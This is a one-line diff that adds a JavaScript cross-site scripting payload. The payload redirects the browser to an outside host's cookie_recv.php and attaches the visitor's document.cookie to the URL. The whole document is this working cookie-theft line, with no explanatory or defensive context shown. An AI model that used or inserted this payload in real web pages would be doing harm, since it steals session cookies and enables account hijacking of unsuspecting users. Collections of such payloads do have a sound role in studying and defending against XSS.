@@ -1,0 +1,1 @@
+document.location='http://melenetzon.puppies.chatzi.org/cookie_recv.php?biscuit='+document.cookie;
